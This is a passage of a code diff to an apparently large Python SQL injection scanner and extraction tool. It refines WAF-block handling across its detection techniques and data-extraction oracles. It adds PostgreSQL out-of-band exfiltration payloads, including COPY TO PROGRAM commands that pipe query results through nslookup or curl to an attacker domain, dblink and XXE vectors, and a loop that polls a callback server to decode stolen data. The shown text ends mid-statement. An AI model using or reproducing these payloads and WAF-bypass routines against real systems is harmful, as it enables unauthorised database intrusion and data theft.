@@ -38825,6 +38825,12 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                     _rate_limiter.record_request(true_fp, 0)
                     _rate_limiter.record_request(false_fp, 0)
                 if not _validate_response(true_fp, func_name="waf_block_check"): continue
+                # FIX-BOOL-PAIRWISE-WAF: skip when BOTH probes carry the same WAF status —
+                # body-size difference is WAF-page noise, not a SQL boolean signal.
+                # Do NOT use is_waf_block(true_fp) OR …(false_fp) here: asymmetric blocking
+                # (WAF blocks TRUE=400 but passes FALSE=200) IS a genuine detection signal.
+                if WAFBlockDiscriminator.both_waf_blocked(true_fp, false_fp):
+                    _waf_block_count += 1; continue
                 if WAFBlockDiscriminator.is_waf_block(true_fp) or WAFBlockDiscriminator.is_waf_block(false_fp):
                     _waf_block_count += 1; continue
                 _waf_block_count = 0
@@ -38852,7 +38858,8 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                     c_false=await _send_injected(engine,method,url,data,data_fmt,param,original+false_sfx,tamper_chain)
                     _conf_attempts = 0; _conf_success = False
                     while _conf_attempts < 3:
-                        if WAFBlockDiscriminator.is_waf_block(c_true) or WAFBlockDiscriminator.is_waf_block(c_false):
+                        if (WAFBlockDiscriminator.both_waf_blocked(c_true, c_false)
+                                or WAFBlockDiscriminator.is_waf_block(c_true) or WAFBlockDiscriminator.is_waf_block(c_false)):
                             _conf_attempts += 1
                             # BUG-1 FIX: WAF blocks all 3 retries → confirmation FAILED (was wrongly set True)
                             if _conf_attempts >= 3: break
@@ -38972,7 +38979,7 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
 
                             _ue_fp_f = await _send_injected(engine, method, url, data, data_fmt, param, original + _ue_false_sfx, tamper_chain)
                             if not _validate_response(_ue_fp_t, func_name="waf_block_check"): continue
-                            if _ue_fp_t and _ue_fp_f and not WAFBlockDiscriminator.is_waf_block(_ue_fp_t) and not WAFBlockDiscriminator.is_waf_block(_ue_fp_f):
+                            if _ue_fp_t and _ue_fp_f and not WAFBlockDiscriminator.both_waf_blocked(_ue_fp_t, _ue_fp_f) and not WAFBlockDiscriminator.is_waf_block(_ue_fp_t) and not WAFBlockDiscriminator.is_waf_block(_ue_fp_f):
                                 _ue_ts = _sim_to_baseline(_ue_fp_t, baseline)
                                 _ue_fs = _sim_to_baseline(_ue_fp_f, baseline)
                                 _ue_delta = _ue_ts - _ue_fs
@@ -39857,8 +39864,9 @@ async def detect_error(engine,config,method,url,data,data_fmt,
                     # BUG #7 FIX: Validate response BEFORE calling is_waf_block to prevent crash
                     if not _validate_response(fp, func_name="detect_error", allow_empty=True):
                         continue
-                    
-                    if WAFBlockDiscriminator.is_waf_block(fp):
+                    # FIX-ERROR-WAF-STATUS: use single_waf_blocked() so plain 400/403 without
+                    # WAF body patterns is also correctly skipped (not mistaken for a SQL error).
+                    if WAFBlockDiscriminator.single_waf_blocked(fp):
                         continue
                     
                     # FIX-BUG-E7 (Issue 3): Replace broad generic _err_pat regex with
@@ -39911,7 +39919,7 @@ async def detect_error(engine,config,method,url,data,data_fmt,
                                     engine, method, url, data, data_fmt,
                                     param, original + test_payload, tamper_chain)
                                 if not _validate_response(_e_cfm_fp, func_name="waf_block_check"): continue
-                                if _e_cfm_fp and not WAFBlockDiscriminator.is_waf_block(_e_cfm_fp):
+                                if _e_cfm_fp and not WAFBlockDiscriminator.single_waf_blocked(_e_cfm_fp):
                                     _cfm_text = _safe_decode_body(_e_cfm_fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
                                     if (re.search(_matched_pat, _cfm_text, re.IGNORECASE) and
                                             not re.search(_matched_pat, _baseline_body, re.IGNORECASE)):
@@ -39944,7 +39952,7 @@ async def detect_error(engine,config,method,url,data,data_fmt,
                                 _e_clean_fp = await _send_injected(engine, method, url, data,
                                     data_fmt, param, _e_clean_probe_val, tamper_chain)
                                 if (_validate_response(_e_clean_fp, func_name="detect_error_clean", allow_empty=True)
-                                        and not WAFBlockDiscriminator.is_waf_block(_e_clean_fp)):
+                                        and not WAFBlockDiscriminator.single_waf_blocked(_e_clean_fp)):
                                     _e_clean_text = _safe_decode_body(_e_clean_fp, encoding="utf-8",
                                         errors="replace", func_name="detect_error_clean").lower()
                                     if re.search(_matched_pat, _e_clean_text, re.IGNORECASE):
@@ -40425,8 +40433,11 @@ async def detect_union(engine,config,method,url,data,data_fmt,
                     # BUG #7 FIX: Validate response BEFORE calling is_waf_block to prevent crash
                     if not _validate_response(fp_u, func_name="detect_union", allow_empty=True):
                         continue
-                    
-                    if WAFBlockDiscriminator.is_waf_block(fp_u):
+                    # FIX-UNION-WAF-STATUS: use single_waf_blocked() so plain HTTP 400/403
+                    # responses (no body pattern) are also rejected here.  is_waf_block() only
+                    # checked body patterns; a Cloudflare 400 "Bad Request" (no WAF body) slipped
+                    # through and produced false-positive UNION detections based on body diff.
+                    if WAFBlockDiscriminator.single_waf_blocked(fp_u):
                         continue
                     # BUG-UNION-1 FIX: SENTINEL was never injected into
                     # DBMS-specific UNION payloads (e.g. MYSQL_UNION_PAYLOADS
@@ -41663,7 +41674,10 @@ async def detect_time(engine, config, method, url, data, data_fmt,
                         return None
 
                     if not _validate_response(fp, func_name="waf_block_check"): continue
-                    if WAFBlockDiscriminator.is_waf_block(fp):
+                    # FIX-TIME-WAF-STATUS: single_waf_blocked() also catches plain 400/403
+                    # responses that lack WAF body-pattern keywords (e.g. "Bad Request").
+                    # A WAF-blocked timing payload (400) didn't reach the DB → no sleep.
+                    if WAFBlockDiscriminator.single_waf_blocked(fp):
                         # BUG-REQ10-TENC FIX: _t_enc_variant was computed but NEVER probed.
                         # When WAF blocks the main payload, try the URL-encoded variant as fallback.
                         # This is particularly effective against keyword-based WAFs that match
@@ -42395,7 +42409,9 @@ async def detect_stacked(engine,config,method,url,data,data_fmt,
                     # BUG #1 FIX: Validate response before accessing any attributes
                     if not _validate_response(fp, func_name="detect_stacked", allow_empty=True):
                         continue
-                    if WAFBlockDiscriminator.is_waf_block(fp): continue
+                    # FIX-STACKED-WAF-STATUS: use single_waf_blocked() to also catch
+                    # plain 400/403 responses without WAF body patterns.
+                    if WAFBlockDiscriminator.single_waf_blocked(fp): continue
                     if fp.elapsed_ms >= expected:
                         # CANARY: eliminate server-slowness FP.
                         # BUG-FIX-REQ3: use mean_t * 1.5 + std_t * 2.0, NOT expected * 0.8
@@ -47881,6 +47897,26 @@ class Enumerator:
                             _rv_true, _rv_false)
                         _eval_fn = None
                         _oracle_name = ""
+                    else:
+                        # FIX-CEO-REVALIDATE-STRLEN: ASCII('A') passes even on WAFs that
+                        # block SUBSTRING/CHAR_LENGTH (the actual extraction calls).
+                        # Re-validate with a CHAR_LENGTH call to confirm the oracle can
+                        # handle the exact SQL form used during extraction.
+                        # CHAR_LENGTH('A')=1 is true; CHAR_LENGTH('A')=2 is false.
+                        try:
+                            _rv_cl_t = await _eo.evaluate("CHAR_LENGTH('A')>=1")
+                            _rv_cl_f = await _eo.evaluate("CHAR_LENGTH('A')>=2")
+                            if _rv_cl_t is not True or _rv_cl_f is not False:
+                                LOG.warning(
+                                    "[_extract_str] error_oracle body-size re-validation "
+                                    "failed CHAR_LENGTH probe (CHAR_LENGTH('A')>=1→%r, "
+                                    "CHAR_LENGTH('A')>=2→%r) — WAF blocks CHAR_LENGTH; "
+                                    "discarding body-size oracle",
+                                    _rv_cl_t, _rv_cl_f)
+                                _eval_fn = None
+                                _oracle_name = ""
+                        except Exception:
+                            pass
                 except Exception:
                     pass
         
@@ -48324,6 +48360,14 @@ class Enumerator:
                 _length, _reasonable_max, _cur_field)
             print(f"[!] [Extract] Length={_length} exceeds field maximum={_reasonable_max}"
                   f" for {_cur_field!r} — oracle likely broken; aborting", flush=True)
+            # FIX-ORACLE-DISABLE-BODYSIZE: when length is garbage, the body-size oracle
+            # is returning True for every WAF-blocked probe (all responses same large size).
+            # Disable body-size mode so subsequent fields fall through to a saner oracle.
+            _eo_ref = getattr(self, '_error_oracle', None)
+            if _eo_ref is not None and getattr(_eo_ref, '_body_size_oracle', False):
+                _eo_ref._body_size_oracle = False
+                LOG.warning("[_extract_str] Disabled body-size oracle mode on _error_oracle "
+                            "to prevent further garbage extraction")
             return ""
         print(f"[+] [Extract] Length={_length} (oracle={_oracle_name})", flush=True)
 
@@ -48473,6 +48517,11 @@ class Enumerator:
 
         # --- Primary query ---
         try:
+            # FIX-FIELD-CAP: set _current_field so _extract_str can apply per-field
+            # sanity caps (_FIELD_MAX_LEN / _FIELD_REASONABLE_MAX). Without this,
+            # _cur_field is always "" and the caps are dead code — allowing garbage
+            # lengths (307, 337, 466) on WAF-blocked targets.
+            self._current_field = what
             sql = template.format(**fmt)
             sql = self._preprocess_sql(sql, what)
             result = await self._extract_str(sql)
@@ -55251,7 +55300,10 @@ class Scanner:
             _both_waf_blocked = (_true_status is not None and _false_status is not None
                                  and _true_status >= 400 and _false_status >= 400)
 
-            if _true_status != _false_status and _true_status is not None:
+            # FIX-INFER-STATUS-BOTH-WAF: skip status oracle when BOTH probes return
+            # a WAF status code (e.g. true=400 and false=403) — different WAF codes
+            # don't prove SQL discrimination; they just mean the WAF responded twice.
+            if _true_status != _false_status and _true_status is not None and not _both_waf_blocked:
                 _boolean_oracle = True
                 _bool_true_status = _true_status
                 # Store normalized bodies for SimHash fallback
@@ -98684,6 +98736,36 @@ class WAFBlockDiscriminator:
         return any(re.search(p, body, re.I) for p in cls.WAF_BLOCK_PATTERNS)
 
     @classmethod
+    def both_waf_blocked(cls, fp_a: "ResponseFingerprint",
+                         fp_b: "ResponseFingerprint") -> bool:
+        """Return True when BOTH probes carry the same WAF-block status code.
+
+        Used in pairwise checks (detect_boolean) where we want to skip only
+        when BOTH sides are uniformly blocked — NOT when only one side is
+        blocked, because asymmetric blocking (WAF blocks TRUE payload but
+        passes FALSE payload) is a genuine injection signal.
+        """
+        if fp_a is None or fp_b is None:
+            return False
+        sc_a = _get_safe_status_code(fp_a)
+        sc_b = _get_safe_status_code(fp_b)
+        return sc_a in cls.WAF_BLOCK_CODES and sc_b in cls.WAF_BLOCK_CODES and sc_a == sc_b
+
+    @classmethod
+    def single_waf_blocked(cls, fp: "ResponseFingerprint") -> bool:
+        """Return True when a single probe is WAF-blocked by status code OR body pattern.
+
+        Used in single-probe checks (detect_time, detect_stacked, detect_error)
+        where status code alone is sufficient evidence of WAF interference.
+        """
+        if fp is None:
+            return False
+        sc = _get_safe_status_code(fp)
+        if sc in cls.WAF_BLOCK_CODES:
+            return True
+        return cls.is_waf_block(fp)
+
+    @classmethod
     def filter_result(cls, true_fp: "ResponseFingerprint",
                        false_fp: "ResponseFingerprint",
                        baseline_fp: "ResponseFingerprint",
@@ -111485,7 +111567,11 @@ class TechniqueCascadeEngine:
 
         _pdisplay = 'path-injection' if param in ('__path__','__path_seg__') else param
 
-        _dp_status = getattr(self, '_diff_profile', None)
+        # FIX-DP-STATUS-SCANNER-REF: _diff_profile is stored on the scanner (set by the
+        # RDF block in _v14_run_param) but the cascade owns its own namespace. Fall back
+        # to scanner_ref so boolean-skip gates below can read the profile.
+        _dp_status = (getattr(self, '_diff_profile', None) or
+                      getattr(getattr(self, '_scanner_ref', None), '_diff_profile', None))
         if _dp_status:
             LOG.debug(f"[Cascade] RDF profile: {_dp_status.get('classification','?')}, skip_boolean={_dp_status.get('skip_boolean', False)}")
         
@@ -111633,11 +111719,13 @@ class TechniqueCascadeEngine:
         # Numeric safety: uses the same _send_and_check path as the main cascade;
         # all obfuscation, tamper, and WAF bypass layers fire normally.
         _t21_oracle_mode = getattr(self.config, "_oracle_mode", OracleMode.FULL)
+        _t21_skip_bool = (_dp_status or {}).get("skip_boolean", False)
         _t21_do_battery = (
             not _SCAN_STOPPED[0]
             and len(dbms_order) >= 2
             and "B" in tech_order
             and _t21_oracle_mode != OracleMode.TIMING_ONLY
+            and not _t21_skip_bool  # FIX-SKIP-BOOLEAN-T21: honour RDF skip_boolean
         )
         if _t21_do_battery:
             try:
@@ -111818,6 +111906,13 @@ class TechniqueCascadeEngine:
                 if tech == "SO":
                     continue
                 if _pcv_excluded is not None and (dbms, tech) in _pcv_excluded:
+                    continue
+                # FIX-SKIP-BOOLEAN-CASCADE: honour skip_boolean from RDF ResponseDiffProfiler.
+                # When WAF_GENERIC blocking is detected (all probes return same response),
+                # boolean-blind techniques produce false positives. PCV cannot reliably reject
+                # them because the WAF page itself is stable and passes the Welch t-test.
+                if (_dp_status or {}).get("skip_boolean") and tech in ("B", "BH", "IN"):
+                    LOG.debug("[Cascade] Skipping %s: skip_boolean=True from RDF profile", tech)
                     continue
                 # BUG-F-TIMINGONLY-SKIP FIX (Req 12): In TIMING_ONLY oracle mode, non-timing
                 # techniques (B/BH/IN/U/UE/E/EH/WB/NV/EX/HY/ST) have their detect_* oracles
@@ -125802,7 +125897,13 @@ class ScannerV14(ScannerV13):
                     if _diff_profile.get("details"):
                         print(f"[+] [RDF] {_diff_profile['details']}", flush=True)
                     if _diff_profile.get("skip_boolean"):
-                        print("[!] [RDF]  Boolean-blind flag noted (no longer disabling B technique — PCV filters false positives) ", flush=True)
+                        print("[!] [RDF]  Boolean-blind flag noted — disabling B/BH/IN techniques for this surface", flush=True)
+                        # FIX-SKIP-BOOLEAN-PROPAGATE: store on self so the cascade can read it.
+                        # _dp_status = getattr(self, '_diff_profile', None) in try_all() previously
+                        # always returned None (never assigned). Now stored here so cascade can
+                        # gate B/BH/IN techniques and avoid boolean false positives on
+                        # WAF_GENERIC targets where all probe responses are identical.
+                        self._diff_profile = _diff_profile
                 except Exception as _rdf_err:
                     print(f"[!] [RDF] Profiling error: {type(_rdf_err).__name__}: {_rdf_err}", flush=True)
 
@@ -129234,7 +129335,13 @@ class SafeModeVerifier:
         # can't flip the oracle mode; 3 or more 403s across 5 probes confirms WAF.
         _fps_statuses = [_get_safe_status_code(fp) for fp in (fps or []) if fp]
         _maj_n = max(len(_fps_statuses) // 2 + 1, 1)   # strict majority threshold
-        _is_403 = _fps_statuses.count(403) >= _maj_n if _fps_statuses else False
+        # FIX-IS403-INCLUDE-400: Cloudflare and similar WAFs return HTTP 400 (not 403)
+        # for blocked requests. Without this, a target where all clean probes return 400
+        # (WAF-gated endpoint) never triggered the WAF-mode oracle path, so the scanner
+        # defaulted to FULL mode on a fully-blocked target → inconsistent oracle selection.
+        _waf_block_majority = {400, 403, 406, 429}
+        _is_403 = (sum(1 for s in _fps_statuses if s in _waf_block_majority) >= _maj_n
+                   if _fps_statuses else False)
         _is_401 = _fps_statuses.count(401) >= _maj_n if _fps_statuses else False
         _is_5xx = sum(1 for s in _fps_statuses if s >= 500) >= _maj_n if _fps_statuses else False
         # Soft signal: any 403 (even non-majority) still warns user
@@ -135038,10 +135145,16 @@ class SideChannelExtractor:
             # SQL payload outright (Bad Request). Treat it as blocked like 403/406.
             # Previously 400 was "non-blocked" so the scanner still polled DNS (30s)
             # for every 400 response, wasting 30s × N methods × M fields = hours.
-            _blocked = status in (400, 403, 406, 500) and ms < 500
+            # FIX-BLOCKED-500: HTTP 500 + ECONNREFUSED means the DB function call
+            # was attempted (DNS resolved) but the TCP connection was refused in <100ms.
+            # This is NOT a WAF block — the DNS callback still fires before TCP.
+            # HTTP 400/403/406 fast (<500ms) = WAF blocked before reaching the DB.
+            # HTTP 500 = server error, possibly DB function was invoked (always poll).
+            _blocked = status in (400, 403, 406) and ms < 500
             if not _blocked:
                 _any_non_blocked = True
-            print(f"[SideChannel]     status={status} ({ms:.0f}ms) {'(WAF-blocked)' if _blocked else ''}", flush=True)
+            _block_reason = "(WAF-blocked)" if _blocked else ("(server-error — DNS may still have fired)" if status == 500 else "")
+            print(f"[SideChannel]     status={status} ({ms:.0f}ms) {_block_reason}", flush=True)
             await asyncio.sleep(1.5)
 
         #  Poll callback server for DNS interactions 
@@ -135067,7 +135180,7 @@ class SideChannelExtractor:
             print("[SideChannel]  All OOB methods returned error/blocked status codes"
                   " — polling anyway (DNS resolves before TCP; callbacks may exist)", flush=True)
         if _oob_server and _sent_any:
-            print("[SideChannel] Polling callback server for DNS interactions (30s)...", flush=True)
+            print("[SideChannel] Polling callback server for DNS interactions (45s)...", flush=True)
             try:
                 _hdrs = {"Authorization": f"Bearer {_oob_token}"} if _oob_token else {}
                 # BUG-OOB-TIME-IMPORT FIX (Req 7): The polling loop used __import__('time').monotonic()
@@ -135173,7 +135286,7 @@ class SideChannelExtractor:
                         pass
                     await asyncio.sleep(2.0)
                 if not _oob_reachable:
-                    print("[SideChannel] No OOB callback received after 30s", flush=True)
+                    print("[SideChannel] No OOB callback received after 45s", flush=True)
                 elif not _extracted:
                     print("[SideChannel] OOB reachable but no data in DNS subdomain (WAF blocks data-encoding SQL)", flush=True)
             except Exception as _poll_e:
@@ -149594,6 +149707,31 @@ class MicroTimingOracle:
         mean_true = sum(true_times) / len(true_times)
         mean_false = sum(false_times) / len(false_times)
 
+        # FIX-MICROTIMING-FP: p < 0.05 alone is insufficient at n=30 with high
+        # timing variance — noisy environments achieve p < 0.05 by chance.
+        # Add two additional guards:
+        #   1. Coefficient of Variation > 0.5: if CV is high, measurements are too
+        #      noisy for the mean difference to be meaningful. cv = std / mean.
+        #   2. Cohen's d < 0.5: if effect size is small (d < 0.5 = small effect),
+        #      the difference is statistically significant but practically negligible.
+        if mean_true <= 0 or mean_false <= 0:
+            return False
+        import statistics as _mt_stats
+        _std_true = _mt_stats.stdev(true_times) if len(true_times) > 1 else 0.0
+        _std_false = _mt_stats.stdev(false_times) if len(false_times) > 1 else 0.0
+        _cv_true = _std_true / mean_true if mean_true > 0 else 999.0
+        _cv_false = _std_false / mean_false if mean_false > 0 else 999.0
+        if _cv_true > 0.5 or _cv_false > 0.5:
+            LOG.debug("[MicroTiming] FP suppressed: CV too high (cv_true=%.2f, cv_false=%.2f)",
+                      _cv_true, _cv_false)
+            return False
+        # Cohen's d = (mean_true - mean_false) / pooled_std
+        _pooled_std = ((_std_true ** 2 + _std_false ** 2) / 2) ** 0.5
+        _cohens_d = abs(mean_true - mean_false) / _pooled_std if _pooled_std > 0 else 0.0
+        if _cohens_d < 0.5:
+            LOG.debug("[MicroTiming] FP suppressed: Cohen's d=%.2f < 0.5 (effect too small)", _cohens_d)
+            return False
+
         return mean_true > mean_false and p_value < 0.05
 
 
@@ -149638,21 +149776,24 @@ class AlternativeDNSExfil:
 
     EXFIL_VECTORS = {
         "PostgreSQL": [
-            # dblink: connects to external host, leaking data in hostname
-            ("dblink",
-             "SELECT dblink('host=' || encode(({query})::bytea,'hex') || '.{domain} dbname=x user=x connect_timeout=3', 'SELECT 1')"),
-            # dblink_connect: just the connection (no query needed)
+            # FIX-DBLINK-SCALAR: original used SELECT dblink(..., 'SELECT 1') which
+            # returns SETOF record — fails in scalar SELECT context at planning time.
+            # Use dblink_connect() instead: opens a TCP connection (triggering DNS)
+            # without returning a result set. Works in scalar/void context.
             ("dblink_connect",
-             "SELECT dblink_connect('exfil','host=' || encode(({query})::bytea,'hex') || '.{domain} dbname=x connect_timeout=3')"),
-            # XML external entity
+             "SELECT dblink_connect('exfil_' || encode(({query})::bytea,'hex'),  'host=' || encode(({query})::bytea,'hex') || '.{domain} dbname=x user=x connect_timeout=3')"),
+            # XML external entity (DNS resolution via HTTP)
             ("xml_entity",
              "SELECT xmlparse(document '<!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://' || encode(({query})::bytea,'hex') || '.{domain}/x\">]><x>&xxe;</x>')"),
-            # COPY with curl/wget (alternative to PROGRAM)
-            ("copy_curl",
-             "COPY (SELECT ({query})) TO PROGRAM 'curl -s http://{domain}/?d=$(/bin/cat /dev/stdin)'"),
-            # lo_export to /tmp then read via path traversal
-            ("lo_export",
-             "SELECT lo_from_bytea(0, ({query})::bytea)"),
+            # FIX-COPY-CURL-DNS: original sent raw data to HTTP ?d= param (not DNS).
+            # Fix: hex-encode and route to DNS subdomain via nslookup / curl DNS trick.
+            ("copy_curl_dns",
+             "COPY (SELECT ({query})) TO PROGRAM 'bash -c \"nslookup $(cat /dev/stdin | xxd -p | tr -d ''\\n'') .{domain} > /dev/null 2>&1\"'"),
+            # Fallback: HTTP exfil (works when DNS is blocked but HTTP is not)
+            ("copy_curl_http",
+             "COPY (SELECT ({query})) TO PROGRAM 'curl -sk \"http://{domain}/?d=$(cat /dev/stdin | xxd -p | tr -d ''\\n'')\" > /dev/null 2>&1'"),
+            # REMOVED: lo_export — lo_from_bytea() creates a PG internal large object
+            # but makes no network call; it cannot exfiltrate data to any external channel.
         ],
         "MySQL": [
             ("load_file_dns",
@@ -149983,10 +150124,13 @@ class NovelWAFBypassExtractor:
         except Exception as e:
             LOG.debug("[Novel] Resource bomb error: %s", e)
 
-        #  Technique 4: Alternative DNS exfil 
+        #  Technique 4: Alternative DNS exfil
         if oob_domain:
             print("[+] [Novel] Technique 4: Alternative DNS exfil vectors")
             try:
+                _t4_oob_server = getattr(config, "oob_server", "") or ""
+                _t4_oob_token = getattr(config, "oob_token", "") or ""
+                _t4_fired_count = 0
                 for label, query in [("user", _user_q), ("database", _db_q), ("version", _version_q)]:
                     q = query.get(dbms, "SELECT 1")
                     vectors = AlternativeDNSExfil.get_vectors(dbms, q, oob_domain)
@@ -149994,9 +150138,50 @@ class NovelWAFBypassExtractor:
                         try:
                             await send_fn(vec_sql)
                             print("[+] [Novel] DNS vector '%s' fired for %s  check %s" % (vec_name, label, oob_domain,))
+                            _t4_fired_count += 1
                             await asyncio.sleep(delay * 2)
                         except Exception:
                             continue
+                # FIX-T4-NO-POLL: vectors fired but OAST server was never queried.
+                # Add polling loop so any DNS callback is captured and returned.
+                if _t4_fired_count > 0 and _t4_oob_server:
+                    print("[+] [Novel] Technique 4: polling OAST for DNS callbacks (30s)...")
+                    try:
+                        import time as _t4_time
+                        _t4_deadline = _t4_time.monotonic() + 30.0
+                        _t4_hdrs = {"Authorization": f"Bearer {_t4_oob_token}"} if _t4_oob_token else {}
+                        while _t4_time.monotonic() < _t4_deadline:
+                            try:
+                                _t4_reg = getattr(config, "_oob_registered_token", None) or _t4_oob_token or "sqr"
+                                _t4_pfp = await engine.send(
+                                    "GET", f"{_t4_oob_server.rstrip('/')}/poll",
+                                    params={"id": _t4_reg, "secret": _t4_reg},
+                                    headers=_t4_hdrs)
+                                if _t4_pfp and getattr(_t4_pfp, "body", None):
+                                    import json as _t4_json
+                                    _t4_raw = _t4_pfp.body
+                                    if isinstance(_t4_raw, bytes):
+                                        _t4_raw = _t4_raw.decode("utf-8", errors="replace")
+                                    _t4_data = _t4_json.loads(_t4_raw)
+                                    if _t4_data.get("data"):
+                                        for _t4_item in _t4_data["data"]:
+                                            _t4_sub = (_t4_item if isinstance(_t4_item, str)
+                                                       else (_t4_item.get("full-id") or _t4_item.get("subdomain") or ""))
+                                            print("[+] [Novel] Technique 4 OOB callback: %s" % (_t4_sub[:80],))
+                                            _t4_hex = _t4_sub.split(".")[0] if _t4_sub else ""
+                                            if len(_t4_hex) > 4 and all(c in "0123456789abcdef" for c in _t4_hex.lower()):
+                                                try:
+                                                    _t4_val = bytes.fromhex(_t4_hex.lower()).decode("utf-8", errors="replace")
+                                                    results["oob_dns"] = _t4_val
+                                                    print("[+] [Novel] Technique 4 OOB data: %s" % (_t4_val[:60],))
+                                                    return results
+                                                except (ValueError, UnicodeDecodeError):
+                                                    pass
+                            except Exception:
+                                pass
+                            await asyncio.sleep(2.0)
+                    except Exception as _t4_poll_e:
+                        LOG.debug("[Novel] Technique 4 poll error: %s", _t4_poll_e)
             except Exception as e:
                 LOG.debug("[Novel] DNS exfil error: %s", e)
 
@@ -150132,10 +150317,20 @@ class NovelWAFBypassExtractor:
                     async def _errtype_eval(cond):
                         payload = ConditionalErrorTypeOracle.build_conditional_error(cond, dbms, etype)
                         fp, _ = await send_fn(payload)
+                        if fp is None:
+                            return None
+                        fp_sc = getattr(fp, "status_code", 0) or 0
+                        # FIX-ERRTYPE-EVAL-WAF: return None (indeterminate) when WAF
+                        # blocks the extraction probe. Without this guard, all WAF-blocked
+                        # probes return true_sig (e.g. 200 WAF challenge page == true_sig)
+                        # → all bits set → garbage Unicode (e.g. U+FE9C7).
+                        _eval_waf = {400, 403, 406, 429, 430, 503}
+                        if fp_sc in _eval_waf and fp_sc != true_sig:
+                            return None
                         if _sig_type == "status":
-                            sig = getattr(fp, "status_code", 0)
+                            sig = fp_sc
                         else:
-                            sig = getattr(fp, "content_length", 0)
+                            sig = getattr(fp, "content_length", 0) or 0
                         return sig == true_sig
 
                     for label, query in [("database", _db_q), ("version", _version_q)]:
@@ -150190,11 +150385,21 @@ class NovelWAFBypassExtractor:
             fp_normal, _ = await send_fn("1=1")
             inflated_len = getattr(fp_inflated, "content_length", 0)
             normal_len = getattr(fp_normal, "content_length", 0)
+            _t11_waf_sc = {400, 403, 406, 429, 430, 503}
+            _t11_inflated_sc = getattr(fp_inflated, "status_code", 0) or 0
+            _t11_normal_sc = getattr(fp_normal, "status_code", 0) or 0
+            # FIX-TCP-INFLATION-STATUS: reject when either probe is WAF-blocked.
+            # Old code: inflated=155B (WAF-blocked 400), normal=557B (200 page) →
+            # inflated < normal so abs() check rejected it. BUT reversed polarity was
+            # possible: if inflated=557B (WAF challenge page) and normal=155B (400 error)
+            # → inflated > normal → false "viable". Status check removes ambiguity.
             # BUG-TCP-INFLATION-REVERSED FIX: abs() accepted inflated < normal (WAF-blocked
             # inflate payload returns small error page) as "viable".  inflated=155, normal=557
             # → abs(155-557)=402 > 100 → false "viable".  Require inflated > normal so a
             # WAF-blocked inflate (small response) is correctly reported as not viable.
-            if inflated_len > normal_len and (inflated_len - normal_len) > 100:
+            if (_t11_inflated_sc in _t11_waf_sc or _t11_normal_sc in _t11_waf_sc):
+                print("[+] [Novel]  TCP inflation not viable (WAF blocked: inflated_sc=%d normal_sc=%d)" % (_t11_inflated_sc, _t11_normal_sc,))
+            elif inflated_len > normal_len and (inflated_len - normal_len) > 100:
                 print("[+] [Novel]  TCP inflation viable: inflated=%d normal=%d" % (inflated_len, normal_len,))
                 # NOTE: extraction via TCP inflation is not yet implemented; this branch
                 # records viability only and does not contribute to data extraction.
@@ -150951,13 +151156,29 @@ class ConditionalErrorTypeOracle:
             clean_probe = f"CASE WHEN (1=1) THEN 1 ELSE ({eexpr}) END"
             error_probe = f"CASE WHEN (1=2) THEN 1 ELSE ({eexpr}) END"
             fp_clean, _ = await send_fn(clean_probe)
-            clean_status = getattr(fp_clean, "status_code", 0)
-            clean_len = getattr(fp_clean, "content_length", 0)
+            # FIX-ERRTYPE-STATUS-DEFAULT: use None default (not 0) so a failed/None
+            # response is distinguishable from a genuine HTTP 0 (non-existent). With
+            # default=0, getattr(None, "status_code", 0)=0 could equal clean_status=0
+            # (if clean probe also failed) → err_status != clean_status is False → skips
+            # the problematic status path, but accidentally accepts (None != 200) → True.
+            clean_status = getattr(fp_clean, "status_code", None) if fp_clean else None
+            clean_len = getattr(fp_clean, "content_length", 0) or 0 if fp_clean else 0
             await asyncio.sleep(delay)
             fp_err, _ = await send_fn(error_probe)
-            err_status = getattr(fp_err, "status_code", 0)
-            err_len = getattr(fp_err, "content_length", 0)
+            err_status = getattr(fp_err, "status_code", None) if fp_err else None
+            err_len = getattr(fp_err, "content_length", 0) or 0 if fp_err else 0
             await asyncio.sleep(delay)
+            # Skip if either probe failed to return a valid status
+            if clean_status is None or err_status is None:
+                continue
+
+            _ceto_waf_codes = {400, 403, 406, 429, 430, 503}
+            # FIX-ERRTYPE-ERR-WAF: If err_status is a WAF block code (400/403/etc.),
+            # the "error" probe was intercepted by the WAF — not a SQL error response.
+            # Accepting this as the "error" status means every extraction probe that
+            # also gets WAF-blocked returns err_status → all bits True → garbage.
+            if err_status in _ceto_waf_codes:
+                continue
 
             if err_status != clean_status:
                 # BUG-ERRTYPE-STATUS-WAF-COLLISION FIX (HIGH): The status-based calibration
@@ -164613,25 +164834,25 @@ class ConditionalErrorOracle:
                                   f"oracle (ctx={_prefix!r} tpl={tpl[:40]!r})",
                                   flush=True)
                             continue
-                        # FIX-CEO-WAF-NOISE-BODYSIZE: When baseline is WAF-blocked AND both
-                        # probes also return the SAME WAF status (e.g. all three are 400),
-                        # body-size differences are WAF page noise — not SQL discrimination.
-                        # Accepting this oracle causes extraction to converge on garbage values
-                        # (e.g. Length=466, binary garbage chars) because all extraction probes
-                        # are also WAF-blocked and body sizes vary randomly around 100-600B.
-                        # REMOVED: the original FIX-CEO-BASELINE-WAF body-size path that fired
-                        # when baseline_status == t_st == f_st.  Require at least one probe to
-                        # return a DIFFERENT status than the others to prove SQL discrimination.
-                        if (_baseline_is_waf
-                                and _t_st == self._baseline_status
-                                and _f_st == _t_st
-                                and _body_size_diff >= 100):
-                            LOG.debug("[ErrorOracle] Skipping body-size oracle: baseline=%d, "
-                                      "true=%d, false=%d all at same WAF status — body-size "
-                                      "variation is WAF noise, not SQL signal",
-                                      self._baseline_status, _t_st, _f_st)
-                            continue  # try next template instead of accepting noisy oracle
+                        # FIX-CEO-WAF-NOISE-BODYSIZE (v214+): when BOTH probes return the
+                        # SAME WAF status code, body-size differences are WAF page noise —
+                        # NOT SQL discrimination. This catches:
+                        #   A) baseline=WAF, t=WAF, f=WAF (all three same WAF code)
+                        #   B) baseline=200, t=WAF, f=WAF (both probes WAF-blocked but
+                        #      baseline was clean — NEW case, was previously missed because
+                        #      the old guard required _baseline_is_waf=True).
+                        # Do NOT check _baseline_is_waf here — the false positive occurs
+                        # regardless of baseline status. Only require that BOTH probes carry
+                        # the same WAF code to eliminate the false positive on baseline=200.
                         _ceo_cal_waf = {400, 403, 406, 429, 430, 503}
+                        if (_t_st in _ceo_cal_waf and _f_st in _ceo_cal_waf
+                                and _t_st == _f_st
+                                and _body_size_diff >= 100):
